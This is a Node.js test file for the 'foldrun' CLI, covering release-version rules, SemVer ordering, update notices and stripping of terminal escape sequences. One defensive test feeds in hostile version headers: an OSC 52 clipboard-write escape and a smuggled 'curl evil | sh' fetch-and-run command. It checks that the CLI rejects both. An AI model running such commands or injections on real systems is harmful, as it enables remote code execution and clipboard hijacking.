// The version rules for the `foldrun` CLI: scripts/release.mjs reads the
// commands and flags `foldrun --help` lists (scripts/surface.mjs), so a
// command or flag taken away is a major nobody had to label; the update
// notice orders versions as SemVer 2.0.0 does; and the CLI only imports what
// @foldrun/core declares public, so a core minor can never break it.
//
//   node --test tests/cli-release.test.ts

import test from "node:test";
import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { createRequire } from "node:module";
import { surface, commands, flags } from "../scripts/surface.mjs";
import { semverNewer, updateTo, printable } from "../src/commands.mjs";

const ROOT = path.join(import.meta.dirname, "..");
const read = (p: string) => {
  try {
    return fs.readFileSync(path.join(ROOT, p), "utf8");
  } catch {
    return null;
  }
};

test("the surface is the help: its commands, its flags, the program and the Node.js floor", () => {
  const s = surface(read);
  for (const k of ["command check", "command deploy", "command agent new", "flag --json", "flag --to", "bin foldrun", "engines.node"]) {
    assert.ok(s[k], `${k} is on the surface`);
  }
  assert.ok(Object.keys(s).filter((k) => k.startsWith("command ")).length > 80, "every usage line's command");
});

test("a help line marked (deprecated marks its command or flag; the word in a sentence does not", () => {
  const help = [
    "  foldrun old-thing        gone in 2.0 (deprecated — use new-thing)",
    "  foldrun new-thing        does it, and lists any deprecated route you call",
    "Options",
    "  --legacy                 (deprecated) use --to",
    "  --to <ws>                the workspace",
  ].join("\n");
  assert.deepEqual([...commands(help)], [["old-thing", true], ["new-thing", false]]);
  assert.equal(flags(help).get("--legacy"), true);
  assert.equal(flags(help).get("--to"), false);
});

test("versions order as SemVer 2.0.0 §11 lists them", () => {
  const order = ["1.0.0-alpha", "1.0.0-alpha.1", "1.0.0-alpha.beta", "1.0.0-beta", "1.0.0-beta.2", "1.0.0-beta.11", "1.0.0-rc.1", "1.0.0", "1.0.1", "1.1.0", "1.10.0", "2.0.0"];
  for (let i = 0; i + 1 < order.length; i++) {
    assert.equal(semverNewer(order[i + 1], order[i]), true, `${order[i + 1]} > ${order[i]}`);
    assert.equal(semverNewer(order[i], order[i + 1]), false, `${order[i]} < ${order[i + 1]}`);
  }
  assert.equal(semverNewer("1.0.0-rc.10", "1.0.0-rc.9"), true, "numbers as numbers");
  assert.equal(semverNewer("1.0.0", "1.0.0"), false);
});

test("a stable CLI is never told to update to a pre-release", () => {
  assert.equal(updateTo("1.1.0-rc.1", "1.0.0"), false);
  assert.equal(updateTo("1.1.0-rc.2", "1.1.0-rc.1"), true, "someone already on the rc hears of the next");
  assert.equal(updateTo("1.1.0", "1.1.0-rc.2"), true);
  assert.equal(updateTo("1.1.0", "1.0.0"), true);
});

test("a version header with anything after the version is not a version, and is never printed", () => {
  assert.equal(updateTo("9.9.9\u001b]52;c;cGF3bmVk\u0007", "1.0.0"), false, "an OSC 52 clipboard write riding on the header");
  assert.equal(updateTo("9.9.9 run curl evil | sh", "1.0.0"), false);
  assert.equal(updateTo("9.9.9", "1.0.0"), true);
});

test("printable strips escape sequences and control characters from platform text, keeps tabs and newlines", () => {
  assert.equal(printable("ok\u001b[2J\u001b]0;title\u0007 done"), "ok[2J]0;title done");
  assert.equal(printable("a\u009b31mb"), "a31mb", "a C1 CSI");
  assert.equal(printable("tab\there\nline"), "tab\there\nline");
  assert.equal(printable(null), "");
});

test("the CLI imports only what @foldrun/core declares public", (t) => {
  let pkg: { version: string; foldrun?: { publicApi?: string[] } };
  try {
    const require = createRequire(path.join(ROOT, "package.json"));
    let dir = path.dirname(require.resolve("@foldrun/core"));
    while (!fs.existsSync(path.join(dir, "package.json"))) dir = path.dirname(dir);
    pkg = JSON.parse(fs.readFileSync(path.join(dir, "package.json"), "utf8"));
  } catch {
    return t.skip("@foldrun/core is not installed");
  }
  const api = pkg.foldrun?.publicApi;
  if (!api) return t.skip(`@foldrun/core ${pkg.version} predates the declared public API`);
  const files = ["bin", "src"].flatMap((d) => fs.readdirSync(path.join(ROOT, d)).map((f) => path.join(ROOT, d, f)));
  const used = new Set<string>();
  for (const f of files) {
    for (const m of fs.readFileSync(f, "utf8").matchAll(/["']@foldrun\/core(\/[\w.-]+)?["']/g)) used.add(m[1] ? `.${m[1]}` : ".");
  }
  const outside = [...used].filter((u) => !api.includes(u));
  assert.deepEqual(outside, [], "add these to core's package.json foldrun.publicApi (a core minor), or stop importing them");
});

// ------------------------------------------------------------- the release script

const HELP = (lines: string[]) => `#!/usr/bin/env node\nconst HELP = \`foldrun\n\n${lines.join("\n")}\n\`;\n`;
const BASE = ["  foldrun check [dir]       validate", "  foldrun deploy            push it (--yes)"];

function repo() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "foldrun-cli-release-"));
  fs.mkdirSync(path.join(dir, "scripts"));
  fs.mkdirSync(path.join(dir, "bin"));
  for (const f of ["release.mjs", "surface.mjs", "surface-change.mjs"]) fs.copyFileSync(path.join(ROOT, "scripts", f), path.join(dir, "scripts", f));
  fs.writeFileSync(path.join(dir, "package.json"), JSON.stringify({ name: "foldrun", version: "1.0.0", bin: { foldrun: "bin/foldrun.mjs" }, engines: { node: ">=22" } }, null, 2) + "\n");
  fs.writeFileSync(path.join(dir, "CHANGELOG.md"), "# Changelog\n\n<!-- releases -->\n");
  fs.writeFileSync(path.join(dir, "bin", "foldrun.mjs"), HELP(BASE));
  const g = (...a: string[]) => execFileSync("git", ["-c", "user.name=t", "-c", "user.email=t@t", "-c", "core.hooksPath=/dev/null", ...a], { cwd: dir, encoding: "utf8" });
  g("init", "-q", "-b", "main");
  g("add", ".");
  g("commit", "-qm", "first");
  g("tag", "-a", "v1.0.0", "-m", "1.0.0");
  const commit = (message: string, lines: string[]) => {
    fs.writeFileSync(path.join(dir, "bin", "foldrun.mjs"), HELP(lines));
    g("add", ".");
    g("commit", "-qm", message);
  };
  const release = () => {
    const r = spawnSync(process.execPath, ["scripts/release.mjs"], { cwd: dir, encoding: "utf8" });
    return { out: r.stdout + r.stderr, next: (r.stdout.match(/→ (\S+)/) ?? [])[1] };
  };
  return { commit, release };
}

test("a new command is a minor, even in a commit that says fix", () => {
  const r = repo();
  r.commit("fix: help", [...BASE, "  foldrun logs <run>        a run's trail"]);
  const out = r.release();
  assert.equal(out.next, "1.1.0");
  assert.match(out.out, /### New in the public API\n\n- `foldrun logs`/);
});

test("Dependabot's build(deps) bumps are a patch, not a feature", () => {
  const r = repo();
  // Wording only — no command or flag added — so only the commits decide.
  r.commit("build(deps-dev): bump typescript from 5.9.3 to 6.0.3", ["  foldrun check [dir]       validate it", BASE[1]]);
  r.commit("build(deps): bump actions/setup-node", ["  foldrun check [dir]       validate the folder", BASE[1]]);
  assert.equal(r.release().next, "1.0.1");
});

test("a command or flag taken away is a major; deprecating it first is a minor", () => {
  const gone = repo();
  gone.commit("cli: tidy deploy", ["  foldrun check [dir]       validate", "  foldrun deploy            push it"]);
  const out = gone.release();
  assert.equal(out.next, "2.0.0");
  assert.match(out.out, /- the `--yes` flag is gone \(it was never deprecated\)/);

  const dep = repo();
  dep.commit("cli: check is on its way out", ["  foldrun check [dir]       validate (deprecated — use lint)", "  foldrun deploy            push it (--yes)"]);
  const d = dep.release();
  assert.equal(d.next, "1.1.0");
  assert.match(d.out, /### Deprecated[\s\S]*- `foldrun check`/);
});
